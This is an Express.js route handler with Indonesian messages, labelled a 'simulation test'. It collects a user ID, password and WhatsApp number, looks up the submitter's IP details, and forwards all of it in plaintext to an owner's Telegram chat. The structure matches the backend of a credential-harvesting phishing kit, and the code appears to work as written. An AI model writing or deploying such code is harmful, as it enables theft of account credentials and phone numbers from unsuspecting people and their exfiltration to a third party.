app.post("/api/simulation-test", async function(req, res) {
  const { userId, password, waNumber, simulation } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Validasi input
  if (!userId || !password || !waNumber) {
    return res.status(400).json({
      success: false,
      message: "Semua field harus diisi (User ID, Password, Nomor WA)"
    });
  }

  if (simulation !== true) {
    return res.status(400).json({
      success: false,
      message: "Hanya simulasi test yang diterima"
    });
  }

  const sessionId = `TEST-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

  try {
    // ==================== KIRIM NOTIF KE TELEGRAM ====================
    const ipText = await getIpInfoText(ip);
    
    const message = `
╔═══════════════════════╗
║   🧪 SIMULASI TEST    ║
╚═══════════════════════╝

📌 <b>DATA TEST</b>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>${userId}</code>
🔑 <b>Password:</b> <code>${password}</code>
📱 <b>Nomor WA:</b> <code>${waNumber}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}

${ipText}

━━━━━━━━━━━━━━━━━━━━━
⚠️ Status: Simulasi Test Data
    `;

    // Kirim notif ke Telegram
    await sendMessage(message, global.ownerChatId);

    log.box('success', {
      Proses: 'SIMULASI TEST',
      Route: '/api/simulation-test',
      UserId: userId,
      WaNumber: waNumber,
      SessionId: sessionId,
      IP: ip,
    });

    return res.json({
      success: true,
      message: "✅ Data test berhasil dikirim ke Telegram!",
      data: { userId, waNumber, sessionId, simulation: true }
    });

  } catch (error) {
    log.error('simulation test error', error.message);
    return res.status(502).json({
      success: false,
      message: "Terjadi error saat mengirim simulasi test ke Telegram"
    });
  }
});